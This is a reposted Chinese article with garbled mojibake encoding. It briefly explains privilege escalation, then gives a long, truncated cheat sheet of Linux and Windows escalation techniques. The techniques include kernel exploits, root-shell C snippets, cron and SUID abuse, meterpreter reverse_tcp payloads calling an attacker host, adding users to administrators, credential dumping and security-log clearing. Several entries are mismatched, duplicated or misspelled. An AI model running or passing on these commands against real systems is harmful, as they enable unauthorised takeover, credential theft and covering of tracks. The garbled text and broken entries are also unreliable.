<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MlRmWVoJebUwFZDvyT0KbA)

ä»€ä¹ˆæ˜¯ç½‘ç»œå®‰å…¨ä¸­çš„æƒé™æå‡ï¼Ÿ
==============

åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸï¼Œäº†è§£å¨èƒè‡³å…³é‡è¦ï¼Œè€Œæœ€å…³é”®çš„å¨èƒä¹‹ä¸€å°±æ˜¯ç‰¹æƒå‡çº§çš„æ¦‚å¿µã€‚ä»æœ¬è´¨ä¸Šè®²ï¼Œæƒé™å‡çº§æ˜¯æŒ‡æ”»å‡»è€…è·å¾—é€šå¸¸ä¸ºé«˜çº§ç”¨æˆ·ä¿ç•™çš„ç³»ç»Ÿæƒé™æˆ–åŠŸèƒ½çš„æƒ…å†µã€‚

ä¸»è¦æœ‰ä¸¤ç§ç±»å‹ï¼šå‚ç›´å‡çº§å’Œæ°´å¹³å‡çº§ã€‚åœ¨å‚ç›´å‡çº§ä¸­ï¼Œå…·æœ‰è¾ƒä½çº§åˆ«æƒé™çš„æ”»å‡»è€…å°†å…¶æƒé™æå‡åˆ°è¾ƒé«˜çº§åˆ«ç”¨æˆ·ï¼ˆé€šå¸¸æ˜¯ç®¡ç†å‘˜ï¼‰çš„æƒé™ã€‚è¿™ä½¿å¾—ä»–ä»¬èƒ½å¤Ÿè®¿é—®å—é™åŒºåŸŸã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ï¼Œç”šè‡³éƒ¨ç½²æ¶æ„è½¯ä»¶ã€‚å¦ä¸€æ–¹é¢ï¼Œæ¨ªå‘å‡çº§æ¶‰åŠè®¿é—®å±äºå¯¹ç­‰ç”¨æˆ·çš„èµ„æºæˆ–åŠŸèƒ½ï¼Œå¹¶åˆ©ç”¨ç±»ä¼¼ç‰¹æƒå¸æˆ·çš„æƒé™ã€‚

ç‰¹æƒå‡çº§çš„å±é™©æ˜¯æ˜¾è€Œæ˜“è§çš„ã€‚é€šè¿‡æå‡æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡ç½‘ç»œå®‰å…¨æªæ–½ï¼Œä»è€ŒæŸå®³æ•°æ®å®Œæ•´æ€§ã€æœºå¯†æ€§å’Œç³»ç»Ÿå¯ç”¨æ€§ã€‚å¯¹äºç»„ç»‡è€Œè¨€ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æ•°æ®æ³„éœ²ã€ç³»ç»Ÿåœæœºä»¥åŠæ½œåœ¨çš„æ³•å¾‹å’Œå£°èª‰åæœã€‚è¯†åˆ«æƒé™å‡çº§çš„è¿¹è±¡å¹¶éƒ¨ç½²é¢„é˜²æ€§ç½‘ç»œå®‰å…¨æªæ–½å¯¹äºä¿æŠ¤æ•°å­—èµ„äº§å¹¶ç¡®ä¿åªæœ‰æˆæƒäººå‘˜æ‰èƒ½è®¿é—®å…³é”®ç³»ç»ŸåŠŸèƒ½è‡³å…³é‡è¦ã€‚

é‰´äºç½‘ç»œå®‰å…¨ä¸æ–­å‘å±•çš„å½¢åŠ¿ï¼Œå¯¹ç‰¹æƒå‡çº§ç­‰å¨èƒä¿æŒè­¦æƒ•è‡³å…³é‡è¦ã€‚å®ƒå¼ºè°ƒäº†ä¸æ–­æ›´æ–°å®‰å…¨åè®®ã€ç›‘æ§ç³»ç»Ÿæ´»åŠ¨ä»¥åŠç¡®ä¿æ­£ç¡®åˆ†é…å’Œå®šæœŸå®¡æ ¸ç”¨æˆ·è§’è‰²å’Œæƒé™çš„é‡è¦æ€§ã€‚è¿™æ ·åšï¼Œç»„ç»‡å¯ä»¥å‡è½»ä¸æœªç»æˆæƒçš„è®¿é—®ç›¸å…³çš„é£é™©ï¼Œå¹¶ä¿æŒå¯¹æ½œåœ¨ç½‘ç»œå¯¹æ‰‹çš„å¼ºå¤§é˜²å¾¡ã€‚

ç°åœ¨æˆ‘ä»¬å·²ç»ç†Ÿæ‚‰äº†è¿™ä¸ªæ¦‚å¿µï¼Œæˆ‘ä»¬å°†ç»§ç»­ç ”ç©¶è¿™ä¸ªææƒæ¦‚å¿µçš„ 117 ç§æ–¹æ³•ï¼š

117 ç§ææƒæ‰‹æ³•
=========

### DirtyC0w

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•: `gcc -pthread c0w.c -o c0w; ./c0w; passwd; id`

æ‰¹æ³¨ï¼šhttps://github.com/firefart/dirtycow

### CVE-2016-1531

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•: `CVE-2016-1531.sh;id`

æ‰¹æ³¨ï¼šhttps://github.com/crypticdante/CVE-2016-1531

### Polkit

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

`https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation`

`./2. poc.sh`

### DirtyPipe

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

1.  `./traitor-amd64 â€“exploit kernel:CVE-2022-0847`
    
2.  `Whoami;id`
    

æ‰¹æ³¨ï¼šhttps://github.com/liamg/traitor/releases/tag/v0.0.14

### PwnKit

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

1.  `./cve-2021-4034`
    
2.  `Whoami;id`
    

æ‰¹æ³¨ï¼šhttps://github.com/berdav/CVE-2021-4034

### ms14_058

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

*   `msf > use exploit/windows/local/ms14_058_track_popup_menu`
    
*   `msf exploit(ms14_058_track_popup_menu) > set TARGET < target-id >`
    
*   `msf exploit(ms14_058_track_popup_menu) > exploit`
    

### Hot Potato

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

1.  å‘½ä»¤æç¤ºç¬¦ä¸‹: `powershell.exe -nop -ep bypass`
    
2.  åœ¨ Power Shell æç¤ºç¬¦ç±»å‹è¾“å…¥: `Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
    
3.  åœ¨ Power Shell æç¤ºç¬¦ç±»å‹è¾“å…¥: `Invoke-Tater -Trigger 1 -Command â€œnet localgroup administrators user /addâ€`
    
4.  è¦ç¡®è®¤æ”»å‡»æ˜¯å¦æˆåŠŸï¼Œè¯·åœ¨ Power Shell æç¤ºç¬¦ä¸­é”®å…¥: `net localgroup administrators`
    

æ‰¹æ³¨ï¼šhttps://github.com/Kevin-Robertson/Tater

### Intel SYSRET

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

1.  `execute -H -f sysret.exe -a "-pid [pid]"`
    

æ‰¹æ³¨ï¼šhttps://github.com/jajp777/sysret

release ç‰ˆæœ¬ï¼šhttps://github.com/jajp777/sysret/tree/master/x64/Release

### PrintNightmare

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

1.

`https://github.com/outflanknl/PrintNightmare`

2.  `PrintNightmare 10.10.10.10 exp.dll`
    

### Folina

åŸŸå: Y/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

1.

`https://github.com/JohnHammond/msdt-follina`

2.  `python3 follina.py -c "notepad"`
    

### ALPC

åŸŸå: Y/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

1.

`https://github.com/riparino/Task_Scheduler_ALPC`

### RemotePotato0

åŸŸå: Y/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

1.  `sudo ntlmrelayx.py -t ldap://10.0.0.10 â€“no-wcf-server â€“escalate-user normal_user`
    
2.  `.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1`
    

æ‰¹æ³¨ï¼š

ntlmrelayx.py åªæ‰¾åˆ°ä¸ªå¾ˆç›¸ä¼¼çš„ï¼šhttps://github.com/LuemmelSec/ntlmrelayx.py_to_exe

remotepotatoï¼šhttps://github.com/antonioCoco/RemotePotato0/releases/tag/1.2

### CVE-2022-26923

åŸŸå: Y/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

1.  `certipy req â€˜lab.local/cve$:CVEPassword1234*@10.100.10.13â€™ -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA`
    
2.  `Rubeus.exe asktgt /user:"ç›®æ ‡_samåç§°" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_åŸŸå" /dc:"åŸŸå_CONTROLLER" /show`
    

æ‰¹æ³¨ï¼š

rubeusï¼šhttps://github.com/GhostPack/Rubeus

### MS14-068

åŸŸå: Y/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â 0/1 Exploit

æ–¹æ³•:

1.  `python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc`
    

æ‰¹æ³¨ï¼š

æ—  py ç‰ˆæœ¬ï¼Œexe ç‰ˆæœ¬ï¼šhttps://github.com/ianxtianxt/MS14-068

### Sudo LD_PRELOAD

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Injection

æ–¹æ³•:

```
Â #include <stdio.h>
Â #include <sys/types.h>
Â #include <stdlib.h>
Â void _init() {
Â unsetenv(â€œLD_PRELOADâ€);
Â Â Â Â Â setgid(0);
Â Â Â Â Â setuid(0);
Â Â Â Â Â system(â€œ/bin/bashâ€);
Â }

```

2.  `gcc -fPIC -shared -o /tmp/ldreload.so ldreload.c -nostartfiles`
    
3.  `sudo LD_RELOAD=tmp/ldreload.so apache2`
    

### Abusing File Permission via SUID Binaries â€“ .so injection)

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Injection

æ–¹æ³•:

1.  `mkdir /home/user/.config`
    

```
Â #include <stdio.h>
Â 
Â #include <stdlib.h>
Â 
Â static void inject() _attribute _((constructor));
Â 
Â void inject() {
Â 
Â  system(â€œcp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -pâ€);
Â 
Â }

```

3.  `gcc -shared -o /home/user/.config/libcalc.so -fPIC/home/user/.config/libcalc.c`
    
4.  `/usr/local/bin/suid-so`
    

`id`

### DLL Injection

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Injection

æ–¹æ³•:

1.  `RemoteDLLInjector64`
    

Or

`MemJect`

Or

`https://github.com/tomcarver16/BOF-DLL-Inject`

2.  `#define PROCESS_NAME "csgo.exe"`
    

Or

`RemoteDLLInjector64.exe pid C:\runforpriv.dll`

Or

`mandllinjection ./runforpriv.dll pid`

æ‰¹æ³¨ï¼š

remoteDllInjectorï¼šhttps://github.com/Al1ex/RemoteDLLInjector

memjectï¼šhttps://github.com/danielkrupinski/MemJect

### Early Bird Injection

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Injection

æ–¹æ³•:

1.

`hollow svchost.exe pop.bin`

æ‰¹æ³¨ï¼šhollow é“¾æ¥ https://github.com/m0n0ph1/Process-Hollowing

### Process Injection through Memory Section

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Injection

æ–¹æ³•:

1.  `sec-shinject PID /path/to/bin`
    

æ‰¹æ³¨ï¼šæœªæ‰¾åˆ°

### Abusing Scheduled Tasks via Cron Path Overwrite

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Abusing Scheduled Tasks

æ–¹æ³•:

1.  `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > systemupdate.sh;`
    
2.  `chmod +x systemupdate.sh`
    
3.  `ç­‰å¾…ä¸€ä¼šå„¿`
    
4.  `/tmp/bash -p`
    
5.  `id && whoami`
    

### Abusing Scheduled Tasks via Cron Wildcards

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Abusing Scheduled Tasks

æ–¹æ³•:

1.  `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/systemupdate.sh;`
    
2.  `touch /home/user/ â€“checkpoint=1;`
    
3.  `touch /home/user/ â€“checkpoint-action=exec=sh\systemupdate.sh`
    
4.  `ç­‰å¾…ä¸€ä¼šå„¿`
    
5.  `/tmp/bash -p`
    
6.  `id && whoami`
    

### Abusing File Permission via SUID Binaries â€“ Symlink)

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Abusing File Permission

æ–¹æ³•:

1.  `su â€“ www-data;`
    
2.  `nginxed-root.sh /var/log/nginx/error.log;`
    
3.  In root user
    
4.  `invoke-rc.d nginx rotate >/dev/null 2>&1`
    

### Abusing File Permission via SUID Binaries â€“ Environment Variables #1)

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Abusing File Permission

æ–¹æ³•:

1.  `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' >/tmp/service.c;`
    
2.  `gcc /tmp/services.c -o /tmp/service;`
    
3.  `export PATH=/tmp:$PATH;`
    
4.  `/usr/local/bin/sudi-env; id`
    

### Abusing File Permission via SUID Binaries â€“ Environment Variables #2)

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Abusing File Permission

æ–¹æ³•:

1.  `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +S /tmp/bash)' /bin/sh -c /usr/local/bin/suid-env2; set +x; /tmp/bash -p`
    

### DLL Hijacking

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.  `Windows_dll.c: cmd.exe /k net localgroup administrators user /add`
    
2.  `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`
    
3.  `sc stop dllsvc & sc start dllsvc`
    

### Abusing Services via binPath

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.  `sc config daclsvc binpath= "net localgroup administrators user /add"`
    
2.  `sc start daclsvc`
    

### Abusing Services via Unquoted Path

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.  `msfvenom -p windows/exec CMD=â€™net localgroup administrators user /addâ€™ -f exe-service -o common.exe`
    
2.  `common.exe æ”¾åœ¨ 'C:\Program Files\Unquoted Path Service'.`
    
3.  `sc start unquotedsvc`
    

### Abusing Services via Registry

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.  `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t`
    
2.  `REG_EXPAND_SZ /d c:\temp\x.exe /f`
    
3.  `sc start regsvc`
    

### Abusing Services via Executable File

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.  `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`
    
2.  `sc start filepermsvc`
    

### Abusing Services via Autorun

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

In Metasploit (msf> prompt) ç±»å‹ï¼š`use multi/handler`

In Metasploit (msf> prompt) ç±»å‹ï¼š`set payload windows/meterpreter/reverse_tcp`

In Metasploit (msf> prompt) ç±»å‹ï¼š`set lhost [Kali VM IP Address]`

In Metasploit (msf> prompt) ç±»å‹ï¼š`run`

æ‰“å¼€å¦ä¸€ä¸ªå‘½ä»¤æç¤ºç¬¦å¹¶é”®å…¥:

`msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`

2.

`program.exe æ”¾åœ¨ 'C:\Program Files\Autorun Program'.`

### Abusing Services via AlwaysInstallElevated

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi`

2.

`msiexec /quiet /qn /i C:\Temp\setup.msi`

Or

`SharpUp.exe AlwaysInstallElevated`

æ‰¹æ³¨ï¼šsharpup é“¾æ¥ https://github.com/GhostPack/SharpUp

### Abusing Services via SeCreateToken

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll`

2.

`!rmpriv`

### Abusing Services via SeDebug

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`Conjure-LSASS`

Or

`syscall_enable_priv 20`

### Remote Process via Syscalls (HellsGate|Hal æ“ä½œç³»ç»Ÿ Gate)

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`injectEtwBypass pid`

æ‰¹æ³¨ï¼šhttps://github.com/boku7/injectEtwBypass

### Escalate With DuplicateTokenEx

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Abuse Privilege

æ–¹æ³•:

`PrimaryTokenTheft.exe pid`

Or

`TokenPlaye.exe â€“impersonate â€“pid pid`

æ‰¹æ³¨ï¼š

primarytokenthenftï¼šhttps://github.com/slyd0g/PrimaryTokenTheft

tokenplayeï¼šhttps://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8

### Abusing Services via SeIncreaseBasePriority

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`start /realtime SomeCpuIntensiveApp.exe`

æ‰¹æ³¨ï¼š

æ‰¾äº†ä¸€åœˆï¼Œåªæœ‰è¿™å„¿æœ‰ç›¸å…³å†…å®¹ï¼šhttps://github.com/gtworek/Priv2Admin

### Abusing Services via SeManageVolume

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`åªéœ€ç¼–è¯‘å¹¶è¿è¡ŒSeManageVolumeAbuse`

æ‰¹æ³¨ï¼šhttps://github.com/xct/SeManageVolumeAbuse

### Abusing Services via SeRelabel

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`WRITE_OWNERå¯¹èµ„æºçš„è®¿é—®æƒé™ï¼ŒåŒ…æ‹¬æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚`

2.

`Run for privilege escalation`

### Abusing Services via SeRestore

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.  `å¯åŠ¨å…·æœ‰ SeRestore æƒé™çš„ PowerShell/ISE`.
    
2.  `ä½¿ç”¨Enable-SeRestorePrivilege å¯ç”¨æƒé™`.
    
3.  `å°†utilman.exeé‡å‘½åä¸ºutilman.old`
    
4.  `å°†cmd.exeé‡å‘½åä¸ºutilman.exe`
    
5.  `é”å®šæ§åˆ¶å°å¹¶æŒ‰Win+U`
    

### Abuse via SeBackup

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

In Metasploit (msf> prompt) è¾“å…¥: `use auxiliary/server/capture/http_basic`

In Metasploit (msf> prompt) è¾“å…¥: `set uripath x`

In Metasploit (msf> prompt) è¾“å…¥: `run`

2.

`åœ¨taskmgrä¸­ï¼Œå³é”®å•å‡»â€œImage Nameâ€æ ä¸­çš„â€œiexplore.exeâ€`

`å¹¶ä»å¼¹å‡ºèœå•ä¸­é€‰æ‹©â€œåˆ›å»ºè½¬å‚¨æ–‡ä»¶â€.`

3.

`strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"`

é€‰æ‹©å¤åˆ¶ Base64 ç¼–ç å­—ç¬¦ä¸²

åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥ï¼š`echo -ne [Base64 String] | Base64-d`

### Abusing via SeCreatePagefile

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`HIBR2BIN /PLATFORM X64 /MAJOR 6 /MINOR 1 /INPUT hiberfil.sys /OUTPUT uncompressed.bin`

æ‰¹æ³¨ï¼šhttps://github.com/MagnetForensics/Hibr2Bin

### Abusing via SeSystemEnvironment

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

.`load C:\dev\PrivEditor\x64\Release\PrivEditor.dll`

2.

`TrustExec.exe -m exec -c "whoami /priv" -f`

æ‰¹æ³¨ï¼šä¸¤ä¸ªå·¥å…·éƒ½æ²¡æ‰¾åˆ° QAQ

### Abusing via SeTakeOwnership

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.  `takeown.exe /f "%windir%\system32"`
    
2.  `icalcs.exe "%windir%\system32" /grant "%username%":F`
    
3.  å°† cmd.exe é‡å‘½åä¸º utilman.exe
    
4.  é”å®šæ§åˆ¶å°å¹¶æŒ‰ Win+U
    

### Abusing via SeTcb

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`PSBits`

Or

`PrivFu`

2.

`psexec.exe -i -s -d cmd.exe`

### Abusing via SeTrustedCredManAccess

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll`

Or

`CredManBOF`

2.

`TrustExec.exe -m exec -c "whoami /priv" -f`

### Abusing tokens via SeAssignPrimaryToken

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`JuicyPotato.exe`

Or

`https://github.com/decoder-it/juicy_2`

`https://github.com/antonioCoco/RoguePotato`

### Abusing via SeCreatePagefile

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Privilege

æ–¹æ³•:

1.

`./WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics`

2.

`flog -s 10s -n 200`

Or

`invoke-module LogCleaner.ps1`

æ‰¹æ³¨ï¼šwela é“¾æ¥ https://github.com/Yamato-Security/WELA

æ—¥å¿—ä¼ªé€ å·¥å…· flogï¼šhttps://github.com/mingrammer/flog

### Certificate Abuse

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abusing Certificate

æ–¹æ³•:

1.

`ceritify.exe request /ca:dc.domain.local\DC-CA /template:Userâ€¦`

2.

`Rubeus.exe asktgy /user:CORP\itadmin /certificate:C:\cert.pfx /password:password`

### Password Mining in Memory

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.  `ps -ef | grep ftp;`
    
2.  `gdp -p ftp_id`
    
3.  `info proc mappings`
    
4.  `q`
    
5.  `dump memory /tmp/mem [start] [end]`
    
6.  `q`
    
7.  `strings /tmp/mem | grep passw`
    

Password Mining in Memory
-------------------------

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

In Metasploit (msf> prompt) è¾“å…¥: `use auxiliary/server/capture/http_basic`

In Metasploit (msf> prompt) è¾“å…¥: `set uripath x`

In Metasploit (msf> prompt) è¾“å…¥: `run`

2.

åœ¨ taskmgr ä¸­ï¼Œå³é”®å•å‡» â€œImage Nameâ€ æ ä¸­çš„â€œiexplore.exeâ€

å¹¶ä»å¼¹å‡ºèœå•ä¸­é€‰æ‹© â€œåˆ›å»ºè½¬å‚¨æ–‡ä»¶â€.

3.

`strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"`

é€‰æ‹©å¤åˆ¶ Base64 ç¼–ç å­—ç¬¦ä¸².

åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥: `echo -ne [Base64 String] | base64 -d`

### Password Mining in Registry

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

Â 1.

æ‰“å¼€å‘½ä»¤å¹¶è¾“å…¥:

`reg query â€œHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogonâ€ /v DefaultUsername`

åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥:

`reg query â€œHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogonâ€ /v DefaultPassword`

è¯·æ³¨æ„è¾“å‡ºä¸­çš„å‡­æ®

åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥:

`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyUsername`

åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥:

`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyPassword`

6.  æ³¨æ„è¾“å‡ºä¸­çš„å‡­æ®
    

åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥:

`reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v Password`

åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥:

`reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v PasswordViewOnly`

è®°ä¸‹åŠ å¯†çš„å¯†ç å¹¶è¾“å…¥:

`C:\Users\User\Desktop\Tools\vncpwd\vncpwd.exe [Encrypted Password]`

ä»è¾“å‡ºä¸­è®°ä¸‹å‡­æ®.

### Password Mining in General Events via SeAudit

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`./WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics`

2.

`flog -s 10s -n 200`

Or

`invoke-module LogCleaner.ps1`

### Password Mining in Security Events via SeSecurity

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`./WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics`

2.

`flog -s 10s -n 200`

Or

`wevtutil cl Security`

### Startup Applications

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

In Metasploit (msf> prompt) è¾“å…¥: `use multi/handler`

In Metasploit (msf> prompt) è¾“å…¥: `set payload windows/meterpreter/reverse_tcp`

In Metasploit (msf> prompt) è¾“å…¥: `set lhost [Kali VM IP Address]`

In Metasploit (msf> prompt) è¾“å…¥: `run`

æ‰“å¼€å¦ä¸€ä¸ªå‘½ä»¤æç¤ºç¬¦å¹¶é”®å…¥:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe`

2.

`å°† x.exe æ”¾åœ¨â€œC:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startupâ€.`

### Password Mining in McAfeeSitelistFiles

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`SharpUp.exe McAfeeSitelistFiles`

æ‰¹æ³¨ï¼šhttps://github.com/GhostPack/SharpUp

### Password Mining in CachedGPPPassword

åŸŸå: Y/N

Local Admin: Yes

